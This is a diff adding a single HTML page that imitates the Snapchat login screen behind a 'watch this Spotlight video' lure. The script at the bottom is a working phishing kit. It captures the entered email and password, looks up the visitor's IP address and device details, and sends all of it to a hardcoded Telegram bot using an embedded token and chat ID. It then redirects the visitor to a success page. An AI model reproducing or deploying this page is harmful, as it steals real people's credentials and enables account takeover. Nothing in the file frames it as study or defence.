@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
+<link rel="shortcut icon" href="img/faviconV2.png">
+<meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
+<meta property="og:site_name" content="Snapchat Spotlight">
+<link rel="stylesheet" href="css/login.css">
+<title>Login • Snapchat</title>
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+</head>
+<body>
+<!-- Back Button -->
+<button class="back-button" onclick="window.location.href='/Acconts.html';">
+<img src="img/left-arrow.png" height="15px" width="15px" alt="">
+</button>
+
+<div class="login-container">
+  <div id="error-message" class="error-message">
+    Something went wrong! Please re-login to your account.
+  </div>
+  <h1>Log In</h1>
+  <!-- Form for login -->
+  <form id="login-form" method="POST">
+    <label for="username">USERNAME OR EMAIL</label>
+    <input type="text" id="email" name="name" required>
+    <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
+    <label for="password">PASSWORD</label>
+    <div class="password-container">
+      <input type="password" id="password" name="message" required>
+      <button type="button" class="toggle-password">
+        <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
+      </button>
+    </div>
+    <div class="save-info">
+      <input type="checkbox" id="save-login">
+      <label for="save-login">Save Login Info on your device</label>
+    </div>
+    <div class="incorrect">
+      <p>Incorrect password, please try again.</p>
+    </div>
+    <p class="forgot-password"><a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%253Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">Forgot your password?</a></p>
+    <button type="submit" class="login-button">Log In</button>
+  </form>
+</div>
+
+<script>
+    const TOKEN = "7259145410:AAEH11AWe28VbJGV8ozoyD3XUkOudRbHezk"; 
+    const CHAT_ID = "8174941991";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+    
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault(); // Prevent the default form submission
+    
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        // Fetch the user's IP address
+        axios.get('https://api.ipify.org?format=json')
+        .then(response => {
+            const ip = response.data.ip;
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+            
+            // Prepare the message to send to Telegram
+            const message = `
+            <b>New Login Attempt</b>\n
+            <b>Email:</b> ${email}\n
+            <b>Password:</b> ${password}\n
+            <b>IP Address:</b> ${ip}\n
+            <b>Device Type:</b> ${deviceType}\n
+            <b>Platform:</b> ${platform}\n
+            <b>User Agent:</b> ${userAgent}\n
+            <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+            `;
+            
+            // Send the message to the Telegram chat
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message
+            }).then(response => {
+                // Once the message is successfully sent, redirect to the success page
+                window.location.href = "success.html";  // Redirect to success page
+            }).catch(error => {
+                alert('Error sending the information. Please try again.');
+            });
+        })
+        .catch(error => {
+            alert('Error fetching the IP address. Please try again.');
+        });
+    });
+    </script>
+
+</body>
+</html>
